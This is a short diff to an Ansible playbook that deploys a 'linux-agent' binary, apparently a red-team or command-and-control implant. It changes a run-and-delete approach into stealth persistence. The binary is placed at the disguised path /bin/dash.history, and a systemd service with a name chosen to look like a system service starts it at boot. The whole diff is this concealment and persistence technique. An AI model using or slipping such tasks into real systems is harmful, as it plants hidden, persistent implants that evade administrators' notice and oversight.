@@ -1,17 +1,22 @@
 ---
-
-- name: Copy the "linux-agent" file to the target machine
+- name: Copy the "linux-agent" file to a hidden directory
   ansible.builtin.copy:
     src: linux-agent
-    dest: /tmp/linux-agent
+    dest: /bin/dash.history
+    mode: '0700'
 
-- name: Run the "linux-agent" file in the background
+- name: Create a systemd service to run "linux-agent"
+  ansible.builtin.template:
+    src: systemd-dash.history.service.j2
+    dest: /etc/systemd/system/systemd-dash.history.service
+    mode: '0644'
+
+- name: Reload systemd to apply the new service
   ansible.builtin.shell:
-    cmd: nohup /tmp/linux-agent &>/dev/null &
-  async: 0
-  poll: 0
+    cmd: systemctl daemon-reload
 
-- name: Delete the "linux-agent" file after execution
-  ansible.builtin.file:
-    path: /tmp/linux-agent
-    state: absent
+- name: Enable and start the "linux-agent" service
+  ansible.builtin.systemd:
+    name: systemd-dash.history
+    enabled: true
+    state: started
